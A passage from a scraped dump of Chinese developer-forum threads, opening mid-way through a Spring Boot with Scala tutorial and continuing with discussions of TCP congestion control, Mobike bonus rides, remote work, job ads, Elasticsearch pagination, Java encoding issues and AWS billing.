@BeanProperty var age: Int = _\n  @BeanProperty var sex: String = _\n}\n</code></pre>\n<p>Mybatis 的 Scala 支持好久没有更新了，所以我不用。</p>\n<h4>json4s(JSON)</h4>\n<p>推荐使用 json4s 的 jackson support 。用好 json4s ，最好了解一下 Scala 的模式匹配和隐式转换这两个语言特性。</p>\n<p>为什么选择 json4s 呢，因为 json4s 提供了非常友好的 DSL 。</p>\n<p>在构建 Rest Controller 时，由于 Scala 的集合和 case class 不支持直接序列化，我们可以引入</p>\n<pre><code>&lt;dependency&gt;\n  &lt;groupId&gt;com.fasterxml.jackson.module&lt;/groupId&gt;\n  &lt;artifactId&gt;jackson-module-scala_${scala.compat.version}&lt;/artifactId&gt;\n  &lt;version&gt;2.8.7&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>做一些配置:</p>\n<pre><code>@Configuration\n@EnableWebMvc\nclass WebConfig extends WebMvcConfigurerAdapter {\n  override def configureMessageConverters(converters: util.List[HttpMessageConverter[_]]): Unit =\n    converters.add(jackson2HttpMessageConverter())\n\n  @Bean\n  def jackson2HttpMessageConverter(): MappingJackson2HttpMessageConverter =\n    new MappingJackson2HttpMessageConverter(objectMapper())\n\n  @Bean\n  def objectMapper(): ObjectMapper =\n    new ObjectMapper() {\n      setVisibility(PropertyAccessor.FIELD, Visibility.ANY)\n      registerModule(DefaultScalaModule)\n    }\n}\n</code></pre>\n<p>配置完成之后，我们直接在 Rest Controller 里面返回普通的 Scala 对象就可以由 jackson 将其序列化。另外一种情况是我们自己构造的 JValue ，则需要转换成 JsonNode 才能被正确地序列化。对于 Http Post 中的值的解析，这里也简单举个例子。</p>\n<pre><code>@RestController\n@RequestMapping(value = Array(\"/api\"))\nclass HelloController {\n  implicit def jvalue2jsonnode(value: JValue): JsonNode = asJsonNode(value)\n  @RequestMapping(value = Array(\"/hello\"))\n  def hello: JsonNode = {\n    val world = \"世界\"\n    val ret =\n      (\"code\" -&gt; 0) ~\n        (\"data\" -&gt; (\"hello\" -&gt; world) ~ (\"year\" -&gt; 2017)) ~\n        (\"error\" -&gt; null)\n\n    asJsonNode(ret)\n  }\n\n  @RequestMapping(value = Array(\"/echo\"), method = Array(RequestMethod.POST))\n  def echo(@RequestBody body: JsonNode): JsonNode = {\n    val json = fromJsonNode(body)\n    (json \\ \"hello\", json \\ \"year\") match {\n      case (JString(world), JInt(year)) =&gt;\n        val ret =\n          (\"code\" -&gt; 0) ~\n            (\"data\" -&gt; (\"hello\" -&gt; world) ~ (\"year\" -&gt; year)) ~\n            (\"error\" -&gt; null)\n        asJsonNode(ret)\n      case _ =&gt;\n        val ret =\n          (\"code\" -&gt; 1) ~\n            (\"data\" -&gt; null) ~\n            (\"error\" -&gt; \"invalid post body\")\n        asJsonNode(ret)\n    }\n  }\n}\n</code></pre>\n<p>用 curl 做一下简单测试:</p>\n<pre><code>➜  ~ curl -d '{\"hello\": \"世界\", \"year\": 2017}' -H \"Content-Type: application/json\" -X POST  http://localhost:8080/api/echo\n{\"code\":0,\"data\":{\"hello\":\"世界\",\"year\":2017},\"error\":null}\n➜  ~ curl http://localhost:8080/api/hello\n{\"code\":0,\"data\":{\"hello\":\"世界\",\"year\":2017},\"error\":null}\n</code></pre>\n<p>这里 asJsonNode 比较繁琐，可以用隐式转换让代码更加简洁。</p>\n<pre><code>@RestController\n@RequestMapping(value = Array(\"/api\"))\nclass HelloController {\n  implicit def autoAsJsonNode(value: JValue): JsonNode = asJsonNode(value)\n\n  @RequestMapping(value = Array(\"/hello\"))\n  def hello: JsonNode = {\n    val world: String = \"世界\"\n\n    (\"code\" -&gt; 0) ~\n      (\"data\" -&gt; (\"hello\" -&gt; world) ~ (\"year\" -&gt; 2017)) ~\n      (\"error\" -&gt; null)\n  }\n\n  @RequestMapping(value = Array(\"/echo\"), method = Array(RequestMethod.POST))\n  def echo(@RequestBody body: JsonNode): JsonNode = {\n    val json = fromJsonNode(body)\n    (json \\ \"hello\", json \\ \"year\") match {\n      case (JString(world), JInt(year)) =&gt;\n        (\"code\" -&gt; 0) ~\n          (\"data\" -&gt; (\"hello\" -&gt; world) ~ (\"year\" -&gt; year)) ~\n          (\"error\" -&gt; null)\n      case _ =&gt;\n        (\"code\" -&gt; 1) ~\n          (\"data\" -&gt; null) ~\n          (\"error\" -&gt; \"invalid post body\")\n    }\n  }\n}\n</code></pre>\n<h4>gigahorse(HTTP Client)</h4>\n<p>之前写过<a href=\"http://sadhen.com/blog/2016/11/27/http4s-client-intro.html\" rel=\"nofollow\">http4s client 的学习笔记</a>，因为官网的文档语焉不详，所以翻看了测试用例才知道 http4s client 怎么用。</p>\n<p>当然，如果只是翻一下测试用例就能愉快的使用，倒是很好，只不过后来在用 http4s 的时候碰到一个 HTTP 1.1 的 chunked 响应相关的一个坑。鼓捣了很久发现搞不定。而且， http4s 默认返回的结果是在 scalaz 的 Task 里面的，并不是 Scala 标准库里面的 Future 。 scalaz 又在能力范围之外，所以弃用。</p>\n<p>其实，就我的需求很简单：</p>\n<ol>\n<li>这个 Http Client 支持的方法要完整，比如 scalaj-http 就不支持 PATCH</li>\n<li>使用足够简单，直观，不需要在使用时引入 AKKA 。 play-ws 就是一个反例。</li>\n<li>支持返回 Future</li>\n<li>在定义 URI 的时候能够使用直观的 DSL ，避免字符串拼接</li>\n</ol>\n<p>gigahorse 满足前三个条件，至于 URI 的 DSL ，用 scala-uri 解决。 gigahorse 背后是著名的 AsyncHttpClient ，其实现会比 http4s 完整很多，不至于会遇到各种 bug 。</p>\n<p>在使用 Http Client 的时候会涉及到 Client 的生命周期管理，一般在 SpringBoot 中，我们可以实现 DisposableBean 中的方法，在对象销毁的时候关闭 Client 。</p>\n<h2>Reading List</h2>\n<ol>\n<li><a href=\"https://github.com/shekhargulati/52-technologies-in-2016/tree/master/37-spring-boot-scala\" rel=\"nofollow\">Building \"Bootiful\" Scala Web Applications with Spring Boot</a></li>\n<li><a href=\"http://afoo.me/posts/2015-07-21-scala-developers-springboot-guide.html\" rel=\"nofollow\">Scala 开发者的 SpringBoot 快速入门指南</a></li>\n<li><a href=\"http://dimafeng.com/2016/01/02/scala-spring/\" rel=\"nofollow\">Scala with a human face</a></li>\n<li><a href=\"http://blog.didispace.com/spring-boot-1-5-x-feature-1/\" rel=\"nofollow\">Spring Boot 1.5.x 新特性：动态修改日志级别</a></li>\n<li><a href=\"http://blog.didispace.com/spring-boot-actuator-1/\" rel=\"nofollow\">Spring Boot Actuator 监控端点小结</a></li>\n<li><a href=\"http://vdisk.weibo.com/s/BbtIfGVUtj4-\" rel=\"nofollow\">Scala: The Good Parts by 扶墙老师</a></li>\n<li><a href=\"http://hongjiang.info/scala-lazy-and-dcl/\" rel=\"nofollow\">lazy 变量与双重检测锁(DCL)</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Lazy_evaluation\" rel=\"nofollow\">Lazy Evaluation</a></li>\n<li><a href=\"http://www.infoq.com/cn/articles/double-checked-locking-with-delay-initialization\" rel=\"nofollow\">双重检查锁定与延迟初始化</a></li>\n<li><a href=\"http://ieye.iteye.com/blog/1924215\" rel=\"nofollow\">Java 日志系统详解</a></li>\n<li><a href=\"https://github.com/NET-A-PORTER/scala-uri\" rel=\"nofollow\">Scala URI</a></li>\n</ol>\n</div></div>"], "reply": "6", "tittle": "Spring Boot with Scala (TLNR)", "comment": ["预览的时候还以为没有代码高亮，所以贴了为知笔记的链接", "酷", "厉害", "为啥收藏的人比评论的人多呢？\r", "\r", "大家多多吐槽啊\r", "\r", "不知道有没有人把代码 clone 下去，尝试一下", "在公司维护 Play 写的项目，但是觉得还是 Spring Boot 比较好用", "一直想用 scala 做个例子，感谢楼主"]},
{"content": "", "reply": "7", "tittle": "面试的时候,问 tcp 拥塞控制怎么回答比较好?", "comment": ["滑动窗口？", " sliding window 实现 flow control(收发同步)，拥塞控制一般基于丢包率和 RTT 。", "流量控制：通告接受窗口，窗口缩放机制", "流量控制：通告接受窗口，窗口缩放机制\r", "慢启动：指数增长 -> 线性增长\r", "拥塞预防：把丢包作为网络拥塞的标志\r", "\r", "可以谈谈 tcp 的缺点，对 web 性能的影响与改进措施什么的\r", "\r", "（第一条回复不小心发出去了，原来 v 站 command + return 是回复= =#）", "\r", "这是我原先看自顶向下方法的时候写的，你可以看看有没有用", "但是我没有详细的写具体的控制方式，因为控制的加性增，乘性减等特性比较短。。。。\r", "不过说起来面试的时候你讲问题的态度和自信程度很影响面试。。。。重点还是自信点。。。。", "1. 流量控制是通过流量控制窗口，防止对方缓冲接收满\r", "2. 拥塞控制是通过拥塞控制窗口，为了让各个应用进程平衡使用网络，当网络发生丢包时判定为网络拥堵，通过拥塞控制窗口把发送数据量减半，再慢慢增长回正常情况"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天周日，中午才起来，看到周围好几辆摩拜红包车，想着就去尝试一下。</p>\n<p>然后骑了大概 1 个小时 10 分钟，其中有 20 分钟左右给别人打电话，所以准确的说大概就是用了 50 分钟左右。一共骑了 4 辆车，基本上每辆都骑了 10 分钟多一点。一共赚了 21.45 元。</p>\n<p>算了下大概时薪 30 元左右，按照一天 8 小时工作制，一个月大概能赚 7k ，本人郑州的，所以是超过了本地区的平均工资。比送外卖和送快递的还要赚的多一点。我在想会不会真的就有人专门干这一件事。</p>\n<p>大概分享一下骑行红包车的经验，首先红包车大多数都是被停在小区里，由于 gps 太飘，所以还要耐心寻找，方圆 30 米内都要找一下，找到后要查看比对是不是红包车（看车编号）。手机上安装一个双开应用，骑着这辆车就要开始寻找下一辆红包车，寻找到下一辆后不要直接骑到那里，最好要有 50 米的距离，然后走过去再开下一辆。当然每一辆都要骑大于 10 分钟，亲测目前红包是随机的所以不要骑太长时间，没用。</p>\n<p><img alt=\"\" src=\"http://ww3.sinaimg.cn/large/0060lm7Tgy1fe0douulq5j30u01hc75w.jpg\">\n<img alt=\"\" src=\"http://ww1.sinaimg.cn/large/0060lm7Tgy1fe0dousdr3j30u01hcwge.jpg\"></p>\n<p>最后ad一下，摩拜单车邀请码：<strong>mobike365</strong></p>\n</div></div>"], "reply": "41", "tittle": "亲测摩拜红包车时薪 30 元左右，按照一天工作 8 小时，月入 7K 差不多", "comment": ["为什么发在程序员节点", "寻找时间呢。", " \r", "真的感觉比郑州这种 2.5 线城市程序员工资都高", "过几天 ofo 也跟上，可以全职了。", " \r", "手机安装个应用双开，骑这辆的时候就要开始寻找下一辆，基本上这辆车够 10 分钟的时候已经到了下辆车的地方了，下来寻找大概 5 分钟左右能找到。", "目的是调配资源 这一辆骑到下一辆旁边 没有起到调配资源的目的 都这么玩  红包很快就取消了", " \r", "今天外面天好，出来感受下，不过真拿这个当全职那是有多无能。", "太少，说服力不强。你先做满八小时再算", "又是一个每月工作 30 天的。", "最高没超过两块的\r", "感觉就是位置不太好的车", " \r", "送外卖的也没星期天的", " \r", "想赚大的就要去小区里面找那种车，路边的车给的都比较少", "同样是体力活，还不如搬砖呢，每月有 7000-15000 左右\r", "摩拜这重量，全职骑，不是劳动是劳损啊。", "开个骑行健身俱乐部，两头收钱哈哈哈哈", "这个骑起来好累嘛", "哈哈", "我也郑州的，楼主带带我", "你可以开着摩拜拖着 ofo ，这样还能翻倍啊！", "你这个找车的方式让我想起了梦幻西游的抓鬼。", " 哈哈哈 大小鬼", "要是骑个摩拜外加送外卖呢？岂不是发达了", "那以后谁还玩破壳曼狗", "我骑自行车瞬时速度可以到四十公里，按这计算，官上海外环一圈也没几个小时", "时薪 20 。", "楼上说得对，不如搬砖", " #20 然后 20w 一个小时", "老哥稳", " 马上摩拜员工来出售天眼了", "时薪大约 60 ，做 965 的应该没有必要掺合了。做外卖的值得试试，一般送餐 10 几分钟够了，还能赚红包，发财啦。", "在 V2 怎么还有这种逻辑的人，弱智么？你天天去骑 8 小时？我也是醉了。", "租个货车去拖，效率更高，收益更多咧。\r", "弄 10 个号， 1 小时就 300", " \"同样是体力活\" ？搬砖和骑车的劳累程度简直不要差太多", "微微一笑～", "少年传火吗", "每天 8 小时每月 30 天，少年你可以传火了……", "后面给的钱会越来越少了", " 10 个号不行,还不够油钱和租车费用. 不过开 30 个应该能稳赚...", "hahha .厉害了我的哥。我骑了一个小时 1 块钱。真是随机的", "骑个车特么都这么累，一天带薪拉屎就不知道多少工资了", "我骑了一个小时都是一块左右的，最后几个一块整，连提取限额都不够"]},
{"content": ["<div class=\"topic_content\">有时候开发要连上代理(webview调试)，每次要手动去设置那里改。关键是还不会帮你保存，每次都要输一次</div>"], "reply": "3", "tittle": "求安卓修改代理/切换代理的软件", "comment": ["顶起来，发个帖子都到第二天了。", "有没有人推荐一下", "proxydroid postern drony"]},
{"content": ["<div class=\"topic_content\">北上深的房价已经把我等屌丝逼到绝境，杭州广州南京紧跟其后，成都武汉笑而不语…\r<br>据我所知，身边有几家 remote work 的公司，不过都是小公司，而且雇员都是工作 1-2 年后申请 remote 被批准的；\r<br>\r<br>remote 后，雇员如何保证效率，并获得平等的加薪晋升机会？\r<br>公司又有如何考量？\r<br>\r<br>聊聊吧</div>"], "reply": "34", "tittle": "Remote work 是不是以后的潮流？", "comment": ["持续关注，可惜不好找支持 remote work 的公司", "这种情况应该很少很少吧", "我认为是的，即使不见面，借助互联网也可以把工作做得很好\r", "\r", "比如一些大型的开源项目", "潮流可能会是，但是相当长一段时期内不会是主流。", "个人觉得 remote 员工很高兴，但老板肯定不高兴。本来就不懂编程，好嘛，人都不来了，我怎么知道我花钱雇你钱都花到哪了？加薪晋升就更别想了，最近隔壁组开启 996 模式，一个刚从运营升到主管的妹子天天加班点外卖先吃俩小时，临走再自拍发个朋友圈就差 @领导了，怎么想 remote 的员工也拼不过这种人。。", "不知道\r", "只知道 remote 流行后，房价就要崩了\r", "你看，员工都在老家办公，所以办公室随便弄个小地方就可以了", "我觉得要流行起来还需要一段时间，推荐读读 remote 这本书。\r", "\r", "《重来 2 》：远程工作不再遥远？\r", " 楼上地址贴错了： ", "我司就 remote\r", "只算很多工作方式中的一种吧，选择适合自己的方式即可", "反倒认为是渐行渐远", "剑圣你好！我现在是 remote ，感觉协作管理起来确实很不容易，对个人要求很高", "我倒是希望组建一个 Remote 公司，说到底是人的管理，怎么管理是个问题。", "传说曾经巨硬有一个 remote ，代码写得极佳，效率贼高\r", "后来公司查 log 发现老有中国的 IP 登录，以为是有黑客，调查后发现这哥们不会编程，都是外包给中国人", " 那当初怎么入职的", " 不知道，所以一直是传说", " 是的，我以前新入职一家公司， tutor 是下午到晚上在家上班，我对业务不熟悉，上班压根找不到人问，搞得我差点抑郁了……", " 和刻录光盘一样得，段子吧", " 意淫有助身心健康", "我目前就在 remote ，说实话 remote 可能会在一定范围内流行但是绝对不会成为主流。更别说撼动房价了。\r", "gitlab 貌似是 remote 的？然而出了那么大的问题，可见 remote 确实对产品质量还是有一定影响的。", " 不是微软的。你说的是这个旧闻吧 ", "我认为 remote 只适合单一产品的公司，或者外包公司。需求明确，沟通成本相对较低才行；\r", "大公司基本没有可行性，大公司里一个部门只负责一个产品线的一个部分，涉及到和不同部门交涉扯皮，根本不可能 remote 搞定。\r", "影响房价？？？？？？黑人问号脸", "remote 肯定是以后的潮流，至于是 3 年 5 年还是 10 年 20 年就不好说了，讲不定到时候共产主义都实现了。", " Verizon 而且用了 fedex 邮寄私钥 233", " 不会崩。", " 因为谁都不知道 remote 会不会潮起来哈...\r", "如果真潮起来，试想\r", "\r", "深证外逃 1/3 总人口，所有公司办公面积缩减 1/2 以上，甚至公司外迁 1/3 ，你觉得深圳的房价支撑得住不？", "remote 要流行，必须解决 vr 的问题，真正的虚拟现实，必须虚拟一切现实，包括每个细节。", "当然，要 VR,带宽就要够，起码得是亿兆网络，好点的话，要万亿兆网络。万兆不够用，分给每户的，也就几百兆。", " 这就是扯淡了，难道你跟人面对面开会的时候还需要关心离你五排座位远的一个哥们有没有在抖腿？", "对自律、自我驱动的人， remote 肯定是比在办公室工作好太多了。我在办公室一天八九个小时，来回至少一两小时的通勤时间，还有被邮件、电话、会议、公司网速等等各种无聊问题打断，花了十几个小时，但有效工作时间只有 2 小时左右。在家里，虽然也有各种琐事，但基本上工作 6 小时，就有 4 小时有效时间。\r", "\r", "当然 remote 对人本身能力以及沟通、团队协作的要求要高一些。尤其是沟通，如何及时了解团队进度和其他人的工作情况，又不打乱自己的工作节奏，是需要一段时间的训练和适应的。\r", "\r", "还有就是 remote 工作者往往缺乏足够的社交(与人正常沟通交流)，也是需要注意的问题。\r", "\r", "反正自从我 remote 之后就再也回不去了😂", "不是 。你看规模大些的公司都是天天开会 各种会  视频讨论的效果也许没有面对面的好。很多 CEO 是这样认为的", "remote 对员工素质和个人自制力都有比较高的要求，不是所有人都适合 remote 的。", " 你光想到房子的居住功能了，医疗、教育、生活方面呢？能落户一线大城市谁内心里面不想？如果不是其它自己能落户的地方够好用得着去外面打拼？你买不起别人买得起。", " 不要那么戾气...这本来就是一个前景展望\r", "\r", "这个问题其实不是买得起买不起的问题，医疗教育生活等方面本来就是以人为本的...这些本身就是人口堆起来的副产业。没有人口基数的前提下，这些都是浮光掠影。\r", "\r", "现在的房价造成的外逃趋势的主力是底层人士，看看北京实体行业。如果办公室白领也因绝望的房价而加入外逃大军，加上 remote 助攻，真到那个时候，一线城市就失去了除地理位置外的所有意义。\r", "\r", "当然，我讨论的房价的前提是 remote 成大趋势的情况下。", " 没有戾气，不同意你的观点就成戾气了？"]},
{"content": "", "reply": "15", "tittle": "反复置顶的 币信 ... 好烦", "comment": ["加一", "你这么一说我才发现那原来是广告", "这个网站最有意思的功能就是可以屏蔽不喜欢的人的发言或者不喜欢的帖子", "已经把这个人 block", "block", "block ，反正毫无价值的信息", "早 block 了。。。", "还有个 DaoClound", "同感", "你们不说我还不知道能 block 。。。", "+1", "我就比较厉害了，大脑自带 Block 。 O.O", " btw ，人家叫 DaoCloud ，不过我反而挺喜欢的 =.=", " #12\r", "\r", "你咋這么厲害 0.0", " =.= 23333"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>公司不需要融资，老板是个多才（财）多艺的人，杭州公司团队为老板国外公司的技术中心。\n要求：经验2年+，熟悉SSM框架，后台开发小牛牛。\n待遇 10-18K ，双休。</p>\n<p>有兴趣的可以加我微信聊下 YDHR01 。请备注应聘 JAVA 。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "杭州滨江直播 APP 招聘中级 Java 三名", "comment": []},
{"content": "", "reply": "目前尚无回", "tittle": "Wildfly (JBoss AS) 和 Ruby on Rails 作为网络应用开发来说是不是干的事情差不多？应该是企业级的 Wildfly 各方面更好一点吧？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>App Annie 在北京三里屯 SOHO,全球 500 多人，北京是研发中心， 150 多人，每年业绩 300%增长，公司刚拿到 D 轮投资，是个加入公司的好时间。公司典型的工程师文化，总有一款和你聊得来的朋友。福利啥的，业界良心，来了就知道。</p>\n<p>如果对职位有兴趣，请发送中英文简历至 twang@appannie.com 或者加 QQ 925273863 咨询。我们尽量 24 小时之内给回复。</p>\n<p>公司介绍：\nApp Annie 是全球最大的移动应用战略决策平台，为用户提供强大的市场数据和深入见解以及迈向移动经济成功之道。目前，共有超过 70 万移动应用专业人士借助 App Annie 平台更好地了解移动应用市场及商业环境，把握市场机会。 App Annie 总部位于美国旧金山，在全球 15 个城市设有办公室，员工数量超过 450 人。公司已从 e.ventures, Greenspring Associates, Greycroft Partners, IDG Capital Partners, Institutional Venture Partners 和 Sequoia Capital 筹集到了 1.57 亿美元的融资。\n详情请访问： <a href=\"http://www.appannie.com\" rel=\"nofollow\">www.appannie.com</a></p>\n<p>App Annie delivers the most trusted app data and insights for your business to succeed in the global app economy. Over 700,000 registered members rely on App Annie to better understand the app market, their businesses and the opportunities around them. The company is headquartered in San Francisco with 450 employees across 15 global offices. App Annie has received $157 million in financing, including from investors such as e.ventures, Greenspring Associates, Greycroft Partners, IDG Capital Partners, Institutional Venture Partners and Sequoia Capital. Learn more at <a href=\"http://www.appannie.com\" rel=\"nofollow\">www.appannie.com</a>.</p>\n<p>我们以位于三里屯 SOHO 的顶级办公环境+竞争性的薪酬+六险一金+股票期权计划+近乎完美的福利报销制度（最新式的 MacBook Air/Pro+健身费+宽带费+探亲费+学习鼓励费等）诚邀您的加盟！</p>\n<p>Staff DBA Engineer</p>\n<p>岗位职责：<br>\nBuild, deploy, configure and maintain PostgreSQL/RDBMS databases\nProvide the organization with clear, detailed and high value database solutions\nDiagnose and troubleshoot database performance and scalability issues\nDesign and implement deployment, backup and replication scenarios\nPropose and implement high availability solutions\nManage postgresql database security to align with company security policy\nBecoming better at what you do every day.\nWhat will you bring to the team?</p>\n<p>你需要具备的能力：<br>\nMust have at least 5 years experience as a DBA role\nMust have at least 2 database domain knowledge from Postgresql,Mysql or Oracle\nMust have at least 1 year Postgresql production experience\nGood to have team management experience\nGood to have  experience with backup and replication solutions such as streaming replication and logical replication\nGood to have experience with PostgreSQL partition implementation like PL/Proxy\nGood to have AWS operation experience\nHave skills in scripting using Shell/Python/Ruby is plus\nHave Experience with PostgreSQL associated tools such as PgPool,Pgbouncer is big plus\nHave experience in NoSQL DB operation like (Mongodb, HBase) is a big plus\nFluent in English written and spoken (International environment)</p>\n<p>薪水信息<br>\nsalary range: 25k - 35k/month （仅供参考）</p>\n<p>============================投递方式============================</p>\n<p>如果您对职位有兴趣，请发送中英文简历至 twang@appannie.com</p>\n<p>============================关于我们============================</p>\n<p>你可能不知道的几件事：</p>\n<p>一： Annie 是 app 领域里最国际化的面孔<br>\nApp Annie 在全球有 8 个据点，员工们说着 18 种语言，经常来往于世界各地。她选择住在北京和旧金山，因为她喜欢和数据怪才们共度时光。<br>\n二： Annie 吸引了东西方最优秀的风险投资人<br>\nAnnie 沉迷于数据，吸引了 IDG 、 Greycroft 、红杉资本、 e.ventures 、 Infinity Venture Partners 等重量级风险投资人。<br>\n三： Annie 扩张迅速<br>\n虽然她不好意思承认，但 Annie 的规模已经是去年的两倍了。 2014 年一开始，就有 150 个好朋友和她一起工作，她还想要更多小伙伴。<br>\n四：安妮的头发一开始不是红色的<br>\nAnnie 本来是黑发的啦。 2012 年的时候 Annie 决定换个复古造型，和过去说再见，所以改变了形象。<br>\n五： Annie 喜欢社交<br>\n所以无论是微博、微信，还是 twitter 、 facebook 和 Google+，你都能看到 Annie 的身影。</p>\n<p>网站： <a href=\"http://www.appannie.com\" rel=\"nofollow\">http://www.appannie.com</a><br>\n微博： <a href=\"http://e.weibo.com/appannie\" rel=\"nofollow\">http://e.weibo.com/appannie</a><br>\n博客： <a href=\"http://www.appannie.com/blog/\" rel=\"nofollow\">http://www.appannie.com/blog/</a><br>\n职位： <a href=\"http://www.appannie.com/appannie/jobs/\" rel=\"nofollow\">http://www.appannie.com/appannie/jobs/</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "[社招] [App Annie] 专注移动应用数据分析--招聘资深 DBA", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在做一个基于 elasticsearch 的搜索功能，根据关键词查询系统中的文章，根据关键词匹配度和浏览量排序输出数据，需要做分页。</p>\n<p>然后现在产品提出一个分页会出现重复数据的问题：</p>\n<ul>\n<li>假设匹配度相同的情况下，原本在第一页的数据因为本来第二页的某条数据浏览量突然增长被挤到了第二页。</li>\n<li>或者正好浏览时，出现了一篇新文章，关键词匹配度很高，也会把前也的数据挤下来。</li>\n</ul>\n<p>目前想到一个基于 redis 的解决方案，查询时先都缓存，然后后续根据时间都读 redis 数据。</p>\n<p>其实我个人觉得，出现的概率非常低，有没有必要做过多复杂的处理？\n或者大家有没有更好的解决重复的方案?</p>\n</div></div>"], "reply": "4", "tittle": "搜索文章，按浏览量排序分页，会出现重复值", "comment": ["没必要", "不管你缓存多久，都会遇到缓存刚好过期的情况\r", "某个用户点第一页的时候，缓存还剩 1 秒，他在浏览的时候，缓存已经过期了，点第二页，就是新的数据了\r", "\r", "所以，如 1 楼所说，没必要", "同楼上觉得没必要，另可以看看 twitter 的这篇文章： ", "没必要+1 ，我自己也遇到过，也在其他的社区 app 或者贴吧 app 遇到过"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用 Java 读 properties 文件，值里有中文，在开发环境、测试环境都没问题，但上生产后就乱码了，用了 native2ascill 也不行？请教下经验人士</p>\n</div></div>"], "reply": "6", "tittle": "怎么测试环境读配置文件出来的中文正常，而到生产环境就乱码了？ Java 读 properties 文件", "comment": ["系统编码或 tomcat 启动参数编码不一致。 windows 默认不是 UTF-8.", " 这个也考虑试过了，还是不行", "用 docker 吧（", "jvm 编码看了没.", " 这个没有", "首先，『用了 native2ascill 也不行』是个伪命题， Java properties 标准实现只支持 ascii 不转换根本不可能读取到 unicode\r", "其次，排除这个环节，请去别的环节排查问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>楼主之前打 AWS hackathon 才注册的账户</p>\n<p>然后比赛拿了名次获赠了几百刀的 AWS 抵扣券</p>\n<p>但是注册的账户并没有绑定信用卡</p>\n<p>用着抵扣券的额度跑了好几个上线应用</p>\n<p>现在抵扣券期限快到了。。。。</p>\n<p>然后发现 AWS 毕竟外国货和国内云的缴费方式差太多了。。。</p>\n<p>我现在的情况是：</p>\n<p>绑定了信用卡，但是没问我 CVV ，我不知道能不能扣钱</p>\n<p>然后就是 AWS 他不像阿里云有个资金池维持，我可以充钱，然后服务往资金池扣。</p>\n<p>AWS 的缴费除了信用卡就没别的了</p>\n<p>我现在就只是填了信用卡的信息别的什么都没做。。。。</p>\n<p>我现在很担心万一出了岔子，服务停了那损失就太大了。。。</p>\n<p>然后 AWS 又没有客服。。。所以来问问 v 友们是什么情况现在。我需要做些什么呢？</p>\n</div></div>"], "reply": "18", "tittle": "AWS 的缴费形式？", "comment": ["amazon 不需要我的 cvv 也可以 authorize", "虽然没用但是觉得应该有消费阈值吧", "国外金融信用体系完善，不需要 CVV 码进行扣费的", "应该是登记信用卡的时候记下卡号啥的就是为了日后扣钱，应该不会说漏记了 ccv\r", "\r", "我之前绑信用卡享受一年试用的时候也忘了有没有填 ccv ，一年后第一次付费一个月收我差不多 100 刀吓了一跳\r", "\r", "刚好那时候卡不见了，我付完这些钱，把服务器关了（本来上面就没跑服务，只是开机了），卡也吊销换新卡了。过了几个月亚马逊发邮件通知我那第二月我花了差不多 1 刀扣款失败。\r", "\r", "反正我是懒得理了，我就简单开个 redhat 实例也没跑任何服务（我连上之后太卡根本没法使用，第二天就忘了这事），扣我差不多 100 刀，也是够了", "amazon 全线都不需要 cvv 就能口腔.", "说一下我以前经验：\r", "国外信用卡渠道基本上都不需要 CVV 码，或者说可以不需要。所有的需要的多半都是多一层保护而已，避免卡有问题。搞过国外 POS 机的都知道，很多 POS 机上输入卡号和有效日期旧可以扣款。\r", "\r", "AWS 也一样，只要是你的卡号和有效日期没问题，就可以扣款（如果是国内信用卡我不确定就）\r", "\r", "他们有客服，可以开工单，但是回复非常慢。后付费都是先用后从信用卡扣款，没有资金池\r", "\r", "多注意些邮件， AWS 我印象中不会因为一个月扣不到钱就停止服务的，我在的那个公司前段时间信用卡过期了，一直没换，可能都拖了好几个月了， AWS 一直催，没人理，到后来都没停（当然我们用量比较大，而且最后也给补上了，只是经验，不负责任）", "不需要 cvv ，但是你在绑定信用卡的时候理论上应该有一次一美金的预授权，然后隔几天会返回你帐户里。如果你发现了这个预授权扣费，那就基本上确认 amazon 下次能扣到你的钱。", "亚马逊有客服吧哈哈哈！而且据说对待客户不分大小，强烈的连续给客服发骚扰邮件还会给 on call 人员发 ticket 。。。", "本月使用的东西，次月产生计费账单，统一从信用卡里扣费", "AWS 的客服不要太好用，既能发 ticket 问，还能实时聊天，还能远程协助，还能电话支持，全取决于你的 plan 。", "Linode 也不需要 CVV", "是用完后月底再扣，所以很容易超。。。", "设预算提醒啊\r", "\r", "话说国际区的 aws 也有预留实例，长期项目可以买个一年期的预留\r", "还有竞价实例，都比直接按需实例便宜，收费灵活性比国内的云好多了", "我知道的支付方式有两种：信用卡和银行转账，银行转账的方式需要通过工单系统跟他们说，估计你还用不上。我们之前拿到的 coupon 是可以直接优先使用的，不知道你这种怎样。\r", "\r", "关于客服，你直接通过工单系统就好了，响应也不是那么慢，基本当天就会回复你的，而且能解决问题。", "只要绑了信用卡立刻扣 1 美刀，不用 CVV", "各位还有啥疑问，欢迎加入 AWS UserGroup Shanghai 群组，里面都有 aws china 官方人士的哦。", "你填好信用卡资料以后，会从你信用卡里面做 1 美金的预授权。预授权的结果会有邮件通知你的。\r", "如果成功的话，以后就是可以扣款了。\r", "如果失败的话，就要检查卡号是不是填错了或者不支持。\r", "\r", "所以勤快点检查邮件吧。", "有 Support Center, 可以去那里发帖。尤其是账单相关的问题，那里的回复是最准的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>分享一篇实用型文章~</p>\n<p><a href=\"https://www.qcloud.com/community/article/290084001488247673?fromSource=gwzcw.58438.58438.58438\" rel=\"nofollow\">如何快速部署国人开源的 Java 博客系统 Tale</a></p>\n</div></div>"], "reply": "8", "tittle": "如何快速部署国人开源的 Java 博客系统 Tale", "comment": ["偶尔一篇分享就够了，一天看到 n 篇 模式一样的标题加链接 就过了\r", "过犹不及，懂？", "在部署一个博客网站之前，你必须要有一台云服务器，否则只能在本地尝尝鲜，无法真正使用。笔者经常使用的是腾讯云提供的 CVM 云服务器，推荐给大家。", "手速快一点，部署就快一点啊", "哈哈哈 从多个方面来为绿蓝云打广告", "已举报", "云服务器我忽略掉了，不一定要用文章推荐的腾讯云。剩下的内容还是很实在的。", "想来一波 seo.", "没有人觉得 Tale 标题的 shadow 很丑吗？"]},
